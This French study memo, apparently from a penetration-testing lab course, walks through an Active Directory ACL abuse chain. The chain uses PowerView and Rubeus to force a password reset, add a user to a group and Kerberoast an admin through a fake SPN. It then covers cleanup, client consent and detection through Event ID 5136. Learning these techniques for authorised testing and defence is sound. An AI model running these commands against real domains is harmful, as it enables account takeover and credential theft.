# Mémo — ACL Abuse Tactics (exploitation de la chaîne)

> Suite de l'[énumération des ACL](memo-acl-enumeration.md) : on exécute la chaîne repérée.
> Départ : user **`wley`** (hash cracké via Responder). Objectif : prendre **`adunn`** (→ DCSync plus tard).
> Domaine : `INLANEFREIGHT.LOCAL`. Tout se fait avec **PowerView** (`C:\Tools\PowerView.ps1`).

---

## 1. La chaîne à exécuter

| # | On contrôle | Droit | Sur | Action |
|---|-------------|-------|-----|--------|
| 1 | `wley` | ForceChangePassword | `damundsen` | reset le mdp de damundsen |
| 2 | `damundsen` | GenericWrite | groupe **Help Desk Level 1** | s'ajouter au groupe |
| 3 | Help Desk L1 *(nested dans)* **Information Technology** | GenericAll | `adunn` | **Kerberoasting ciblé** (fake SPN) |

> 💡 On ne touche **jamais** le mdp de `adunn` (compte admin « à ne pas interrompre ») → au lieu de reset, on fait du **targeted Kerberoasting**.

---

## 2. Astuce clé : rejouer l'identité avec un PSCredential

Pas besoin de se reconnecter : on forge un objet credential et on le passe via `-Credential`.
```powershell
$SecPassword = ConvertTo-SecureString '<MDP_WLEY>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
> `ConvertTo-SecureString ... -AsPlainText -Force` = transformer un mdp en clair en SecureString (obligatoire pour PSCredential).

---

## 3. Étape 1 — reset du mdp de damundsen (droit ForceChangePassword)

```powershell
# Nouveau mdp qu'on va imposer à damundsen
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
# → VERBOSE: Password for user 'damundsen' successfully reset
```
- `Set-DomainUserPassword` = fonction PowerView qui applique **ForceChangePassword**.
- ⚠️ **Destructif** → accord client obligatoire (cf. OPSEC plus bas).
- Depuis Linux : `pth-net` (pth-toolkit).
- Toujours mettre **`-Verbose`** (feedback succès/erreur).

---

## 4. Étape 2 — s'ajouter à Help Desk Level 1 (droit GenericWrite)

On rejoue en `damundsen` (avec le mdp qu'on vient de poser) :
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# (option) vérifier qu'on n'est pas déjà membre
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# ajout
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# confirmation
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
> `Add-DomainGroupMember` abuse **GenericWrite** (ou Add Members / GenericAll). Depuis Linux : pth-toolkit.

---

## 5. Étape 3 — targeted Kerberoasting sur adunn (droit GenericAll via nesting)

`damundsen` ∈ Help Desk L1 ∈ **Information Technology** → hérite de **GenericAll** sur `adunn`.
On pose un **faux SPN** puis on le Kerberoast :
```powershell
# 1. créer un SPN bidon sur adunn
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# 2. récupérer le TGS
.\Rubeus.exe kerberoast /user:adunn /nowrap
# → $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@...  (etype RC4 = crackable)
```
- `Set-DomainObject` écrit l'attribut `servicePrincipalName` (permis par GenericAll/GenericWrite).
- Le hash se craque offline avec **Hashcat -m 13100** → mdp clair de `adunn`.
- Depuis Linux : outil **`targetedKerberoast`** (crée le SPN, roast, supprime le SPN — tout en une commande).

---

## 6. Cleanup (⚠️ ORDRE IMPORTANT)

> Remettre dans l'état initial, **dans cet ordre** : si on retire le user du groupe d'abord, on **perd** les droits pour nettoyer le SPN.

1. **Retirer le faux SPN** de adunn :
   ```powershell
   Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
   ```
2. **Retirer damundsen** de Help Desk Level 1 :
   ```powershell
   Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
   # vérif :
   Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'}
   ```
3. **Remettre le mdp de damundsen** à sa valeur d'origine (si connue) ou faire reset par le client / alerter le user.

> 📝 Même après cleanup : **tout documenter** dans le rapport final (le client doit connaître chaque modif de l'environnement).

---

## 7. Detection & Remediation (côté défense)

| Reco | Détail |
|------|--------|
| **Auditer / supprimer les ACL dangereuses** | audits AD réguliers + former le staff à lancer **BloodHound** |
| **Monitorer l'appartenance aux groupes** | surveiller tous les groupes à fort impact (changement = possible attaque ACL) |
| **Auditer les changements d'ACL** | Advanced Security Audit Policy → **Event ID 5136** « A directory service object was modified » |

### Lire l'event 5136 (SDDL → lisible)
Le détail de l'event est en **SDDL** (Security Descriptor Definition Language), illisible brut.
```powershell
ConvertFrom-SddlString "O:BAG:BAD:AI(...)" | select -ExpandProperty DiscretionaryAcl
```
→ révèle p.ex. que `mrb3n` a reçu **GenericWrite** sur l'objet domaine = signe d'une tentative d'attaque ACL.

---

## 8. À retenir

| Point | Détail |
|-------|--------|
| Rejouer une identité | **PSCredential** + `-Credential` (pas besoin de se reco) |
| Mdp clair → objet | `ConvertTo-SecureString '...' -AsPlainText -Force` |
| ForceChangePassword | `Set-DomainUserPassword` (⚠️ destructif) |
| GenericWrite sur groupe | `Add-DomainGroupMember` |
| GenericAll sur user admin | **targeted Kerberoast** : `Set-DomainObject -SET @{serviceprincipalname=...}` + Rubeus |
| Linux équivalents | `pth-net`, pth-toolkit, `targetedKerberoast` |
| Cleanup | SPN **puis** groupe **puis** mdp (sinon on perd les droits) |
| Détection | Event ID **5136** + `ConvertFrom-SddlString` |
